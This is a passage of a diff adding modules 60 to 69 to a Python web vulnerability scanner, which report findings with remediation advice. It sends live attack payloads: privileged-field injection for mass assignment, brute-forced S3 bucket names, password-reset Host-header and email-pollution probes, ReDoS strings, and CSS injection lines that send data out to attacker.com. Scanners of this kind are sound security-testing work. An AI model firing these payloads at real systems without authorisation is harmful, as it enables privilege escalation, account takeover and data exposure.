+                        add("cloud_bucket", {
+                            "severity": "Low",
+                            "confirmed": True,
+                            "title": f"Cloud Storage Bucket Detected (Access Denied)",
+                            "description": f"Cloud bucket exists at {ref_url} but returns 403. Bucket enumeration is possible. Data may be exposed through bucket listing if misconfigured.",
+                            "recommendation": "Review bucket permissions. Ensure no sensitive bucket names are guessable. Enable access logging.",
+                            "url": ref_url,
+                            "evidence": f"HTTP 403 from {ref_url} — bucket exists",
+                        })
+                except Exception: pass
+    except Exception: pass
+
+    # Enumerate guessed bucket names
+    found_count = 0
+    all_patterns = s3_patterns + gcs_patterns + azure_patterns
+    for variant in variants[:8]:  # limit to avoid too many requests
+        for pattern in all_patterns[:4]:  # check primary patterns
+            bucket_url = pattern.format(variant)
+            try:
+                r = rget(bucket_url, timeout=4, allow_redirects=True)
+                if r.status_code == 200:
+                    found_count += 1
+                    vuln(f"Open cloud bucket: {bucket_url}", "Critical")
+                    add("cloud_bucket", {
+                        "severity": "Critical",
+                        "confirmed": True,
+                        "title": f"Open Cloud Storage Bucket: {variant}",
+                        "description": f"Cloud storage bucket '{variant}' is publicly readable. All data inside is accessible without credentials.",
+                        "recommendation": "Immediately set bucket policy to private. Audit contents for sensitive data. Enable CloudTrail/audit logging.",
+                        "url": bucket_url,
+                        "evidence": f"HTTP 200 from {bucket_url} ({len(r.text)} bytes)",
+                    })
+                elif r.status_code == 403:
+                    # Bucket exists but private — still worth noting
+                    info(f"Bucket exists (private): {bucket_url}")
+                    add("cloud_bucket", {
+                        "severity": "Info",
+                        "confirmed": True,
+                        "title": f"Cloud Bucket Exists (Private): {variant}",
+                        "description": f"Bucket '{variant}' exists but is not publicly readable. Verify there are no policy misconfigurations.",
+                        "recommendation": "Regularly audit bucket policies. Enable object-level access logging.",
+                        "url": bucket_url,
+                        "evidence": f"HTTP 403 — bucket exists at {bucket_url}",
+                    })
+            except Exception: pass
+
+    if found_count == 0:
+        good("No open cloud storage buckets found")
+    _module_done("cloud_bucket")
+
+
+# ═══════════════════════════════════════════════════════════════════════
+#  MODULE 60 — MASS ASSIGNMENT
+# ═══════════════════════════════════════════════════════════════════════
+def mass_assignment_scan(url):
+    if _module_skip("mass_assignment"): return
+    section("MODULE 60 — MASS ASSIGNMENT","📦")
+
+    parsed = urlparse(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+
+    # API endpoints that commonly accept JSON bodies
+    API_ENDPOINTS = [
+        "/api/users", "/api/user", "/api/account", "/api/profile",
+        "/api/register", "/api/signup", "/api/update",
+        "/users", "/user/update", "/account/update",
+        "/api/v1/users", "/api/v2/users",
+    ]
+
+    # Privileged fields to inject
+    PRIV_FIELDS = [
+        ("isAdmin",    True),
+        ("is_admin",   True),
+        ("admin",      True),
+        ("role",       "admin"),
+        ("roles",      ["admin"]),
+        ("permission", "admin"),
+        ("privileged", True),
+        ("superuser",  True),
+        ("is_staff",   True),
+        ("verified",   True),
+        ("status",     "active"),
+        ("balance",    999999),
+        ("credits",    999999),
+    ]
+
+    for ep in API_ENDPOINTS:
+        ep_url = base + ep
+        try:
+            # First, probe if endpoint exists
+            probe = rget(ep_url, allow_redirects=False, timeout=TIMEOUT)
+            if probe.status_code not in (200, 201, 400, 401, 403, 405, 422):
+                continue
+
+            # Try POST with privileged fields
+            for field_name, field_val in PRIV_FIELDS[:5]:
+                try:
+                    payload = {"username": "test", "email": "test@example.com",
+                               "password": "Test@123!", field_name: field_val}
+                    r = rpost(ep_url, json=payload, timeout=TIMEOUT)
+                    if r.status_code in (200, 201):
+                        try:
+                            resp = r.json()
+                            # Check if the privileged field was reflected back (accepted)
+                            if isinstance(resp, dict):
+                                if field_name in str(resp).lower() or str(field_val).lower() in str(resp).lower():
+                                    vuln(f"Mass assignment: field '{field_name}' accepted at {ep}", "High")
+                                    add("mass_assignment", {
+                                        "severity": "High",
+                                        "confirmed": True,
+                                        "title": f"Mass Assignment — Privileged Field '{field_name}' Accepted",
+                                        "description": f"POST to {ep_url} with field '{field_name}={field_val}' returned 200/201 and reflected the privileged field. Attackers may be able to elevate privileges.",
+                                        "recommendation": "Use allowlists (never denylists) to whitelist only expected fields. Use separate DTOs for user input.",
+                                        "url": ep_url,
+                                        "evidence": f"POST {{{field_name}: {field_val}}} → 200 | Response contains field: {str(resp)[:200]}",
+                                    })
+                        except Exception: pass
+                    elif r.status_code == 200 and field_name in r.text:
+                        add("mass_assignment", {
+                            "severity": "Medium",
+                            "confirmed": False,
+                            "title": f"Potential Mass Assignment — Field '{field_name}' Reflected",
+                            "description": f"POST to {ep_url} with '{field_name}' field — the field name appears in the response. Manual verification needed.",
+                            "recommendation": "Use allowlists for accepted fields. Never bind user input directly to model objects.",
+                            "url": ep_url,
+                            "evidence": f"Field '{field_name}' found in response body",
+                        })
+                except Exception: pass
+        except Exception: pass
+
+    good("Mass assignment scan complete")
+    _module_done("mass_assignment")
+
+
+# ═══════════════════════════════════════════════════════════════════════
+#  MODULE 61 — ACCOUNT TAKEOVER VECTORS
+# ═══════════════════════════════════════════════════════════════════════
+def account_takeover_scan(url):
+    if _module_skip("acct_takeover"): return
+    section("MODULE 61 — ACCOUNT TAKEOVER VECTORS","🔐")
+
+    parsed = urlparse(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+
+    # 1. Password reset endpoint detection
+    reset_endpoints = [
+        "/forgot-password", "/forgot_password", "/reset-password", "/reset_password",
+        "/password/reset", "/password/forgot", "/account/recover",
+        "/api/forgot-password", "/api/reset-password", "/auth/reset",
+        "/users/password/new", "/account/password/reset",
+    ]
+
+    for ep in reset_endpoints:
+        try:
+            r = rget(base + ep, allow_redirects=True, timeout=TIMEOUT)
+            if r.status_code == 200 and len(r.text) > 200:
+                body = r.text.lower()
+                if any(x in body for x in ["email","forgot","reset","recover","password"]):
+                    info(f"Password reset endpoint: {ep}")
+
+                    # Test: host header injection in reset link
+                    try:
+                        r2 = rpost(base + ep,
+                                   data={"email": "attacker@evil.com"},
+                                   headers={"Host": "attacker.com", "User-Agent": UA},
+                                   timeout=TIMEOUT, allow_redirects=False)
+                        if r2.status_code in (200, 302):
+                            add("acct_takeover", {
+                                "severity": "High",
+                                "confirmed": False,
+                                "title": f"Password Reset — Host Header Injection Possible",
+                                "description": f"Reset endpoint at {base+ep} accepted a POST with forged Host header. If the reset link uses the Host header, attackers can send victims reset links pointing to attacker.com.",
+                                "recommendation": "Generate reset links using a configured application URL, never the Host header.",
+                                "url": base+ep,
+                                "evidence": f"POST to {ep} with Host: attacker.com → {r2.status_code}",
+                            })
+                    except Exception: pass
+
+                    # Test: email parameter pollution
+                    try:
+                        r3 = rpost(base + ep,
+                                   data={"email": "victim@example.com,attacker@evil.com"},
+                                   timeout=TIMEOUT)
+                        if r3.status_code == 200:
+                            add("acct_takeover", {
+                                "severity": "Medium",
+                                "confirmed": False,
+                                "title": f"Password Reset — Email Parameter Pollution",
+                                "description": f"Reset endpoint accepted comma-separated email addresses. If the backend sends to all addresses, attackers who include their email can capture reset tokens.",
+                                "recommendation": "Validate that email is a single valid address. Reject comma-separated values.",
+                                "url": base+ep,
+                                "evidence": f"POST email=victim@example.com,attacker@evil.com → {r3.status_code}",
+                            })
+                    except Exception: pass
+
+                    # Test: weak reset token (predictable numeric token)
+                    # Look for token format in URL/response
+                    if "token=" in r.url or "token" in body:
+                        add("acct_takeover", {
+                            "severity": "Medium",
+                            "confirmed": False,
+                            "title": f"Password Reset Token Visible in Response",
+                            "description": f"The reset endpoint at {base+ep} includes or references a 'token' field. Verify token is cryptographically random (256-bit entropy).",
+                            "recommendation": "Use cryptographically secure random tokens (secrets.token_urlsafe(32)). Set short expiry (15 min). Use one-time tokens.",
+                            "url": base+ep,
+                            "evidence": f"'token' found in reset endpoint body/URL",
+                        })
+        except Exception: pass
+
+    # 2. Username enumeration on login/reset
+    login_ep = None
+    for ep in ["/login", "/signin", "/api/login", "/api/auth/login", "/auth"]:
+        try:
+            r = rget(base + ep, allow_redirects=True, timeout=TIMEOUT)
+            if r.status_code == 200:
+                login_ep = base + ep
+                break
+        except Exception: pass
+
+    if login_ep:
+        try:
+            # Test with known bad user vs known bad password for existing user
+            r_nonexist = rpost(login_ep, data={"username": "nonexistentuser123xqz", "password": "wrongpass"}, timeout=TIMEOUT)
+            r_mayexist  = rpost(login_ep, data={"username": "admin", "password": "wrongpass"}, timeout=TIMEOUT)
+
+            body1 = r_nonexist.text.lower()
+            body2 = r_mayexist.text.lower()
+
+            # Different error messages = username enumeration
+            # e.g., "user not found" vs "invalid password"
+            user_not_found = any(x in body1 for x in ["user not found","no account","doesn't exist","invalid username"])
+            wrong_password = any(x in body2 for x in ["invalid password","wrong password","incorrect password"])
+
+            if user_not_found or wrong_password:
+                add("acct_takeover", {
+                    "severity": "Medium",
+                    "confirmed": True,
+                    "title": "Username Enumeration via Login Error Messages",
+                    "description": "Login endpoint returns different error messages for non-existent users vs wrong passwords, allowing attackers to enumerate valid usernames.",
+                    "recommendation": "Return generic error: 'Invalid username or password' for all failed logins. Use timing-safe comparison.",
+                    "url": login_ep,
+                    "evidence": f"Non-exist user msg: {body1[:100]} | Wrong pass msg: {body2[:100]}",
+                })
+            elif r_nonexist.elapsed.total_seconds() - r_mayexist.elapsed.total_seconds() > 1.0:
+                add("acct_takeover", {
+                    "severity": "Medium",
+                    "confirmed": True,
+                    "title": "Username Enumeration via Response Timing",
+                    "description": f"Login takes {r_mayexist.elapsed.total_seconds():.2f}s for existing users vs {r_nonexist.elapsed.total_seconds():.2f}s for non-existing. Timing difference allows username enumeration.",
+                    "recommendation": "Use constant-time comparison for password verification. Add artificial delay to equalize response time.",
+                    "url": login_ep,
+                    "evidence": f"Timing delta: {abs(r_nonexist.elapsed.total_seconds()-r_mayexist.elapsed.total_seconds()):.2f}s",
+                })
+        except Exception: pass
+
+    good("Account takeover scan complete")
+    _module_done("acct_takeover")
+
+
+# ═══════════════════════════════════════════════════════════════════════
+#  MODULE 62 — ReDoS (Regular Expression Denial of Service)
+# ═══════════════════════════════════════════════════════════════════════
+def redos_scan(url):
+    if _module_skip("redos"): return
+    section("MODULE 62 — REGEX DOS (ReDoS)","⏱️")
+
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query)
+    if not params:
+        params = {"email": ["test@example.com"], "search": ["test"],
+                  "phone": ["1234567890"], "username": ["testuser"]}
+
+    # ReDoS payloads targeting common vulnerable regexes
+    REDOS_PAYLOADS = {
+        "email": [
+            "a" * 30 + "@" + "a" * 30 + "." + "a" * 30,
+            "aaa@aaa." + "a" * 50,
+            "a@" + "." * 50 + "com",
+        ],
+        "phone": [
+            "1" * 50 + "!",
+            "+1" + "1" * 48,
+        ],
+        "username": [
+            "a" * 50 + "!",
+            "aA" * 25 + "!",
+        ],
+        "search": [
+            "a" * 100,
+            "<" + "a" * 50 + ">",
+        ],
+        "generic": [
+            "a" * 50 + "!",
+            ("a?" * 25) + ("a" * 25),
+        ],
+    }
+
+    # Measure baseline
+    try:
+        t0 = time.time()
+        rget(url, timeout=TIMEOUT)
+        baseline = time.time() - t0
+    except Exception:
+        baseline = 1.0
+
+    for param in list(params.keys())[:4]:
+        # Choose payloads based on param name
+        param_lower = param.lower()
+        if "email" in param_lower:
+            payloads = REDOS_PAYLOADS["email"]
+        elif "phone" in param_lower:
+            payloads = REDOS_PAYLOADS["phone"]
+        elif "user" in param_lower or "name" in param_lower:
+            payloads = REDOS_PAYLOADS["username"]
+        elif "search" in param_lower or "query" in param_lower or "q" == param_lower:
+            payloads = REDOS_PAYLOADS["search"]
+        else:
+            payloads = REDOS_PAYLOADS["generic"]
+
+        for payload in payloads:
+            try:
+                tp = dict(params); tp[param] = [payload]
+                test_url = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
+                t0 = time.time()
+                r = rget(test_url, timeout=max(TIMEOUT, baseline + 10))
+                elapsed = time.time() - t0
+                delay = elapsed - baseline
+                if delay > 3.0:
+                    vuln(f"ReDoS CONFIRMED param='{param}' delay={elapsed:.1f}s (baseline={baseline:.1f}s)", "High")
+                    add("redos", {
+                        "severity": "High",
+                        "confirmed": True,
+                        "title": f"ReDoS (Regex Denial of Service) CONFIRMED — Parameter '{param}'",
+                        "description": f"CONFIRMED: Parameter '{param}' caused {delay:.1f}s delay above baseline with crafted input. Indicates vulnerable regex processing that can be exploited for DoS.",
+                        "recommendation": "Audit all regex patterns. Avoid catastrophic backtracking patterns like (a+)+ or (a|aa)+. Use regex timeout/atomic groups.",
+                        "url": test_url,
+                        "evidence": f"Payload length {len(payload)} chars → {elapsed:.2f}s response (baseline {baseline:.2f}s, delta +{delay:.2f}s)",
+                    })
+                    break
+            except requests.exceptions.Timeout:
+                vuln(f"ReDoS CONFIRMED (timeout) param='{param}'", "High")
+                tp2 = dict(params); tp2[param] = [payload]
+                add("redos", {
+                    "severity": "High",
+                    "confirmed": True,
+                    "title": f"ReDoS CONFIRMED (Server Timeout) — Parameter '{param}'",
+                    "description": f"CONFIRMED: Parameter '{param}' caused server timeout with ReDoS payload. Server-side regex is vulnerable to catastrophic backtracking.",
+                    "recommendation": "Replace vulnerable regex with safe alternatives. Add timeout for regex evaluation.",
+                    "url": parsed._replace(query=urlencode(tp2, doseq=True)).geturl(),
+                    "evidence": f"Server timed out processing ReDoS payload for param '{param}'",
+                })
+                break
+            except Exception: pass
+
+    good("ReDoS scan complete")
+    _module_done("redos")
+
+
+# ═══════════════════════════════════════════════════════════════════════
+#  MODULE 63 — CLICKJACKING
+# ═══════════════════════════════════════════════════════════════════════
+def clickjacking_scan(url):
+    if _module_skip("clickjacking"): return
+    section("MODULE 63 — CLICKJACKING","🖱️")
+
+    try:
+        r = rget(url, timeout=TIMEOUT)
+        hdrs = {k.lower(): v for k,v in r.headers.items()}
+
+        xfo = hdrs.get("x-frame-options","")
+        csp = hdrs.get("content-security-policy","")
+
+        frame_protected = False
+
+        if xfo:
+            if xfo.upper() in ("DENY","SAMEORIGIN"):
+                frame_protected = True
+                good(f"X-Frame-Options: {xfo} — Clickjacking protected")
+            elif "ALLOW-FROM" in xfo.upper():
+                # Allow-from is deprecated and not supported in modern browsers
+                frame_protected = False
+                add("clickjacking", {
+                    "severity": "Medium",
+                    "confirmed": True,
+                    "title": "X-Frame-Options Uses Deprecated ALLOW-FROM",
+                    "description": "X-Frame-Options: ALLOW-FROM is deprecated and not supported by Chrome, Firefox, or Edge. The site may still be frameable in modern browsers.",
+                    "recommendation": "Replace with Content-Security-Policy: frame-ancestors 'none' or 'self'.",
+                    "url": url,
+                    "evidence": f"X-Frame-Options: {xfo}",
+                })
+
+        if csp and "frame-ancestors" in csp.lower():
+            frame_protected = True
+            good(f"CSP frame-ancestors present — Clickjacking protected")
+
+        if not frame_protected:
+            # Check if the page can actually be framed (some servers redirect/break in frames)
+            vuln(f"Clickjacking — no framing protection on {url}", "Medium")
+            add("clickjacking", {
+                "severity": "Medium",
+                "confirmed": True,
+                "title": "Clickjacking Protection Missing",
+                "description": "Page lacks X-Frame-Options or Content-Security-Policy frame-ancestors header. Attackers can embed this page in an iframe and trick users into performing unintended actions (clicks, form submissions, purchases).",
+                "recommendation": "Add: Content-Security-Policy: frame-ancestors 'none'; or X-Frame-Options: DENY. For single-origin embedding: frame-ancestors 'self'.",
+                "url": url,
+                "evidence": f"X-Frame-Options: {xfo or 'MISSING'} | CSP frame-ancestors: {'MISSING' if 'frame-ancestors' not in csp.lower() else 'present but check value'}",
+            })
+        else:
+            good("Clickjacking protection confirmed")
+    except Exception as e:
+        info(f"Clickjacking check error: {e}")
+
+    _module_done("clickjacking")
+
+
+# ═══════════════════════════════════════════════════════════════════════
+#  MODULE 64 — JSONP INJECTION
+# ═══════════════════════════════════════════════════════════════════════
+def jsonp_scan(url):
+    if _module_skip("jsonp_inject"): return
+    section("MODULE 64 — JSONP INJECTION","🔗")
+
+    parsed = urlparse(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+
+    # Common JSONP endpoints
+    JSONP_ENDPOINTS = [
+        "/api/user", "/api/profile", "/api/data", "/api/account",
+        "/jsonp", "/callback", "/api/callback",
+        "/api/v1/user", "/api/v2/user",
+        "/user.json", "/profile.json", "/data.json",
+    ]
+    CALLBACK_PARAMS = ["callback", "cb", "jsonp", "jsonpcallback",
+                       "jcb", "fn", "func", "function"]
+    MALICIOUS_CALLBACK = "alert"
+
+    # Check crawled URLs with query params for JSONP patterns
+    to_check = JSONP_ENDPOINTS[:]
+    for crawled_url in list(CRAWLED_URLS)[:20]:
+        cp = urlparse(crawled_url)
+        qp = parse_qs(cp.query)
+        if any(cb in qp for cb in CALLBACK_PARAMS):
+            to_check.append(cp.path)
+
+    for ep in to_check[:15]:
+        ep_url = base + ep
+        for cb_param in CALLBACK_PARAMS:
+            try:
+                test_url = f"{ep_url}?{cb_param}={MALICIOUS_CALLBACK}"
+                r = rget(test_url, timeout=TIMEOUT,
+                         headers={"Origin": "https://attacker.example.com",
+                                  "Referer": "https://attacker.example.com/"})
+                ct = r.headers.get("Content-Type","")
+                body = r.text
+
+                # JSONP confirmed if: callback name appears in response wrapping JSON
+                if MALICIOUS_CALLBACK + "(" in body or MALICIOUS_CALLBACK + " (" in body:
+                    vuln(f"JSONP injection CONFIRMED: {ep}?{cb_param}=alert", "High")
+                    add("jsonp_inject", {
+                        "severity": "High",
+                        "confirmed": True,
+                        "title": f"JSONP Injection CONFIRMED — {ep}?{cb_param}=",
+                        "description": f"CONFIRMED: Endpoint {ep_url} reflects the callback parameter value unvalidated. Attacker can set callback to malicious function name. If authenticated users visit attacker page loading this JSONP, their data is stolen.",
+                        "recommendation": "Whitelist allowed callback function names. Prefer CORS over JSONP. Add Content-Type: application/json.",
+                        "url": test_url,
+                        "evidence": f"Response starts with: {body[:100]}",
+                    })
+                    break
+                elif cb_param in parse_qs(urlparse(r.url).query) and "application/javascript" in ct:
+                    add("jsonp_inject", {
+                        "severity": "Medium",
+                        "confirmed": False,
+                        "title": f"Potential JSONP Endpoint — {ep}?{cb_param}=",
+                        "description": f"Endpoint returns JavaScript content-type with callback parameter. Manual verification required to confirm JSONP injection.",
+                        "recommendation": "Whitelist callback names. Prefer CORS. Set Content-Type: application/json.",
+                        "url": test_url,
+                        "evidence": f"Content-Type: {ct}",
+                    })
+            except Exception: pass
+
+    good("JSONP scan complete")
+    _module_done("jsonp_inject")
+
+
+# ═══════════════════════════════════════════════════════════════════════
+#  MODULE 65 — CSS INJECTION
+# ═══════════════════════════════════════════════════════════════════════
+def css_injection_scan(url):
+    if _module_skip("css_inject"): return
+    section("MODULE 65 — CSS INJECTION","🎨")
+
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query)
+    if not params:
+        params = {"theme": ["default"], "color": ["blue"],
+                  "style": ["light"], "css": [""], "skin": ["default"]}
+
+    CSS_PAYLOADS = [
+        "};body{background:red}/*",
+        "} body { background-color: red; } /*",
+        "@import url('https://attacker.com/steal.css');",
+        "* { background: url('http://attacker.com/?d=' attr(data-secret)) }",
+        "input[value^='a'] ~ * { background: url('http://attacker.com/a') }",
+    ]
+
+    for param in list(params.keys())[:4]:
+        for payload in CSS_PAYLOADS[:3]:
+            try:
+                tp = dict(params); tp[param] = [payload]
+                test_url = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
+                r = rget(test_url, timeout=TIMEOUT)
+                body = r.text
+                ct = r.headers.get("Content-Type","")
+
+                # Check if payload appears in CSS context (style block or external CSS)
+                if ("text/css" in ct or "<style" in body.lower()) and payload in body:
+                    vuln(f"CSS injection CONFIRMED param='{param}'", "Medium")
+                    add("css_inject", {
+                        "severity": "Medium",
+                        "confirmed": True,
+                        "title": f"CSS Injection CONFIRMED — Parameter '{param}'",
+                        "description": f"CONFIRMED: CSS payload reflected inside <style> block or CSS response. Attackers can inject CSS to exfiltrate CSRF tokens, perform data theft via attribute selectors, or deface the page.",
+                        "recommendation": "Sanitize CSS input. Use CSP with strict-dynamic. Never interpolate user input into CSS.",
+                        "url": test_url,
+                        "evidence": f"Payload '{payload[:50]}' reflected in CSS context",
+                    })
+                    break
+                elif payload in body:
+                    add("css_inject", {
+                        "severity": "Low",
+                        "confirmed": False,
+                        "title": f"Potential CSS Injection — Parameter '{param}'",
+                        "description": f"CSS payload reflected in HTML response. Manual check required to confirm CSS context.",
+                        "recommendation": "Sanitize all user input used in stylesheets or style attributes.",
+                        "url": test_url,
+                        "evidence": f"Payload '{payload[:50]}' found in response",
+                    })
+            except Exception: pass
+
+    good("CSS injection scan complete")
+    _module_done("css_inject")
+
+
+# ═══════════════════════════════════════════════════════════════════════
+#  MODULE 66 — HTTP/2 VULNERABILITIES
+# ═══════════════════════════════════════════════════════════════════════
+def http2_scan(url):
+    if _module_skip("http2_vulns"): return
+    section("MODULE 66 — HTTP/2 VULNERABILITIES","🌐")
+
+    parsed = urlparse(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+
+    try:
+        # Check if HTTP/2 is supported
+        r = rget(url, timeout=TIMEOUT)
+        # requests uses HTTP/1.1 by default; check response version
+        # We can detect HTTP/2 support via ALPN/Alt-Svc header
+        alt_svc = r.headers.get("Alt-Svc","")
+        upgrade = r.headers.get("Upgrade","")
+        h2_supported = "h2" in alt_svc or "h2" in upgrade.lower()
+
+        if h2_supported:
+            info(f"HTTP/2 advertised via Alt-Svc: {alt_svc}")
+            # Note: actual HTTP/2 testing requires httpx or h2 library
+            add("http2_vulns", {
+                "severity": "Info",
+                "confirmed": True,
+                "title": "HTTP/2 Protocol Supported",
+                "description": f"Server advertises HTTP/2 support via Alt-Svc or Upgrade header. HTTP/2 implementations should be audited for rapid reset (CVE-2023-44487), header injection, and stream ID exhaustion.",
+                "recommendation": "Ensure HTTP/2 is current version. Rate-limit streams. Apply server patches for CVE-2023-44487 (Rapid Reset).",
+                "url": url,
+                "evidence": f"Alt-Svc: {alt_svc}",
+            })
+
+        # Check for HTTP/2 Rapid Reset vulnerability indication (CVE-2023-44487)
+        # This can't be fully tested without HTTP/2 library but we flag based on version
+        server_hdr = r.headers.get("Server","").lower()
+        if any(s in server_hdr for s in ["nginx/1.18","nginx/1.19","nginx/1.20","nginx/1.21","nginx/1.22",
+                                          "nginx/1.23","nginx/1.24","apache/2.4.5","apache/2.4.56",
+                                          "apache/2.4.57","apache/2.4.58"]):
+            add("http2_vulns", {
+                "severity": "High",
+                "confirmed": False,
+                "title": f"Potential HTTP/2 Rapid Reset Vulnerability (CVE-2023-44487)",
+                "description": f"Server version ({r.headers.get('Server','')}) may be affected by HTTP/2 Rapid Reset DDoS (CVE-2023-44487). This allows attackers to send RST_STREAM immediately after HEADERS to overwhelm server.",
+                "recommendation": "Update web server. Apply vendor patches. Implement stream rate limiting. Use DDoS mitigation service.",
+                "url": url,
+                "evidence": f"Server: {r.headers.get('Server','')}",
+            })
+
+        # Check for HTTP request smuggling potential
+        # Test: Content-Length vs Transfer-Encoding conflict
+        try:
+            smuggle_r = _sess.get(url, timeout=TIMEOUT,
+                                   headers={"Transfer-Encoding": "chunked",
+                                            "Content-Length": "5"})
+            if smuggle_r.status_code == 200:
+                add("http2_vulns", {
+                    "severity": "Medium",
+                    "confirmed": False,
+                    "title": "Potential HTTP Desync / Smuggling Vector",
+                    "description": "Server accepted conflicting Transfer-Encoding and Content-Length headers. This may enable HTTP request smuggling between frontend/backend proxy pairs.",
+                    "recommendation": "Normalize ambiguous requests at reverse proxy. Use same HTTP version throughout stack. Apply vendor security patches.",
+                    "url": url,
+                    "evidence": "GET with both TE:chunked and CL:5 → 200 OK",
+                })
+        except Exception: pass
+
+    except Exception as e:
+        info(f"HTTP/2 scan error: {e}")
+
+    good("HTTP/2 scan complete")
+    _module_done("http2_vulns")
+
+
+# ═══════════════════════════════════════════════════════════════════════
+#  MODULE 67 — CVE MAPPING (Technology → Known CVEs)
+# ═══════════════════════════════════════════════════════════════════════
+def cve_mapping_scan(url):
+    if _module_skip("cve_scan"): return
+    section("MODULE 67 — CVE MAPPING","📋")
+
+    # Pull technology detection results from FINDINGS
+    detected_techs = []
+    for item in FINDINGS.get("tech", []):
+        tech_str = str(item)
+        for tech_name in CVE_DB.keys():
+            if tech_name.lower() in tech_str.lower():
+                detected_techs.append(tech_name)
+
+    # Also check headers directly
+    try:
+        r = rget(url, timeout=TIMEOUT)
+        hdrs_str = str(dict(r.headers)).lower()
+        body_low  = r.text[:5000].lower()
+        for tech_name in CVE_DB.keys():
+            if tech_name.lower() in hdrs_str or tech_name.lower() in body_low:
+                if tech_name not in detected_techs:
+                    detected_techs.append(tech_name)
+    except Exception: pass
+
+    if not detected_techs:
+        info("No technologies matched CVE database")
+        _module_done("cve_scan"); return
+
+    info(f"CVE mapping: checking {len(detected_techs)} detected technologies")
+    mapped_count = 0
+
+    for tech in detected_techs:
+        cves = CVE_DB.get(tech, [])
+        if cves:
+            mapped_count += len(cves)
+            # Group by severity
+            critical_cves = [c for c in cves if c["cvss"] >= 9.0]
+            high_cves     = [c for c in cves if 7.0 <= c["cvss"] < 9.0]
+
+            if critical_cves:
+                sev = "Critical"
+            elif high_cves:
+                sev = "High"
+            else:
+                sev = "Medium"
+
+            cve_list = ", ".join(c["id"] for c in cves)
+            top_cve = max(cves, key=lambda c: c["cvss"])
+
+            vuln(f"CVE match: {tech} → {len(cves)} CVEs (highest: {top_cve['id']} CVSS {top_cve['cvss']})", sev)
+            add("cve_scan", {
+                "severity": sev,
+                "confirmed": False,
+                "title": f"CVE Match: {tech} — {len(cves)} Known Vulnerabilities",
+                "description": (f"Technology '{tech}' has {len(cves)} known CVEs in database. "
+                               f"Highest severity: {top_cve['id']} (CVSS {top_cve['cvss']}): {top_cve['desc']}. "
+                               f"ALL CVEs: {cve_list}. "
+                               f"Note: Actual exploitability depends on exact version. Verify version before confirming."),
+                "recommendation": f"Identify exact {tech} version. Apply all security patches. Subscribe to {tech} security advisories. Consider upgrading to latest stable.",
+                "url": url,
+                "evidence": f"Technology '{tech}' detected | CVEs: {cve_list}",
+            })
+
+    if mapped_count:
+        good(f"CVE mapping: {mapped_count} CVEs mapped across {len(detected_techs)} technologies")
+    else:
+        good("CVE mapping: no known CVEs for detected technologies")
+
+    _module_done("cve_scan")
+
+
+# ═══════════════════════════════════════════════════════════════════════
+#  MODULE 68 — S3 BUCKET BRUTE-FORCE
+# ═══════════════════════════════════════════════════════════════════════
+def s3_brute_scan(url):
+    if _module_skip("s3_brute"): return
+    section("MODULE 68 — S3 BUCKET BRUTE-FORCE","🪣")
+
+    parsed = urlparse(url)
+    domain = parsed.hostname or ""
+    parts  = domain.split(".")
+    company = re.sub(r"[^a-z0-9-]", "", (parts[-2] if len(parts) >= 2 else parts[0]).lower())
+
+    # Extended bucket name list for brute-force
+    BUCKET_NAMES = [
+        company, f"{company}-backup", f"{company}-bkp", f"{company}-data",
+        f"{company}-files", f"{company}-assets", f"{company}-media",
+        f"{company}-uploads", f"{company}-static", f"{company}-images",
+        f"{company}-img", f"{company}-logs", f"{company}-log",
+        f"{company}-dev", f"{company}-development", f"{company}-staging",
+        f"{company}-prod", f"{company}-production", f"{company}-release",
+        f"{company}-public", f"{company}-private", f"{company}-storage",
+        f"{company}-bucket", f"{company}-store", f"{company}-archive",
+        f"{company}-config", f"{company}-conf", f"{company}-secrets",
+        f"backup-{company}", f"static-{company}", f"assets-{company}",
+        f"files-{company}", f"uploads-{company}", f"media-{company}",
+        f"dev-{company}", f"staging-{company}", f"prod-{company}",
+        f"{company}backup", f"{company}files", f"{company}data",
+        f"{company}2", f"{company}3", f"{company}test",
+    ]
+
+    found = 0
+    for name in BUCKET_NAMES[:20]:
+        for s3_url_tpl in [
+            f"https://{name}.s3.amazonaws.com/",
+            f"https://s3.amazonaws.com/{name}/",
+        ]:
+            try:
+                r = rget(s3_url_tpl, timeout=4, allow_redirects=True)
+                if r.status_code == 200:
+                    found += 1
+                    # Try to list objects
+                    files_found = re.findall(r"<Key>([^<]+)</Key>", r.text)
+                    vuln(f"Open S3 bucket: {name} ({len(files_found)} objects visible)", "Critical")
+                    add("s3_brute", {
+                        "severity": "Critical",
+                        "confirmed": True,
+                        "title": f"Open S3 Bucket Found: {name}",
+                        "description": f"S3 bucket '{name}' is publicly readable. {len(files_found)} object(s) visible. Any data stored can be downloaded without authentication.",
+                        "recommendation": "Set bucket ACL to private immediately. Add S3 Block Public Access. Audit all objects for sensitive data. Enable CloudTrail.",
+                        "url": s3_url_tpl,
+                        "evidence": f"HTTP 200 from {s3_url_tpl} | Objects: {', '.join(files_found[:5]) if files_found else 'bucket listing visible'}",
+                    })
+                elif r.status_code == 403:
+                    info(f"S3 bucket exists (private): {name}")
+                    add("s3_brute", {
+                        "severity": "Info",
+                        "confirmed": True,
+                        "title": f"S3 Bucket Identified (Private): {name}",
+                        "description": f"S3 bucket '{name}' exists but access is denied. Verify ACL is intentionally private and no other misconfigurations exist.",
+                        "recommendation": "Enable S3 Block Public Access. Use least-privilege IAM policies. Enable access logging.",
+                        "url": s3_url_tpl,
+                        "evidence": f"HTTP 403 from {s3_url_tpl}",
+                    })
+                break  # found on this pattern, skip next pattern for same name
+            except Exception: pass
+
+    if found == 0:
+        good("No open S3 buckets found in brute-force")
+    _module_done("s3_brute")
+
+
+# ═══════════════════════════════════════════════════════════════════════
+#  MODULE 69 — WAYBACK MACHINE / ARCHIVE URLS
+# ═══════════════════════════════════════════════════════════════════════
+def wayback_scan(url):
+    if _module_skip("wayback_urls"): return
+    section("MODULE 69 — WAYBACK / ARCHIVE URLS","🕰️")
+
+    parsed = urlparse(url)
+    domain = parsed.hostname or ""
+
+    try:
+        # Query Wayback CDX API for historical URLs
+        wb_api = (f"https://web.archive.org/cdx/search/cdx?"
+                  f"url={domain}/*&output=json&fl=original&collapse=urlkey"
+                  f"&filter=statuscode:200&limit=100")
